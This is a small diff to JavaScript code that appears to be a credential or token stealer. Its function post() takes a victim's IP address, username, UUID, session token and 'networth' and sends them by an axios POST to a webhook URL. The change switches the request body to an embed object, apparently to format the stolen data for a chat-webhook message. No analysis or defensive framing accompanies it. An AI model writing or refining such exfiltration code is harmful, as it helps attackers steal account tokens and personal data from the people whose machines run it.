@@ -129,7 +129,7 @@ function post(ip, username, uuid, token, webhook, networth, description) {
        method: "POST",
        url: webhook,
        headers: { "Content-Type": "application/json" },
-       data: data,
+       data: embed,
     };
     
      axios(config)
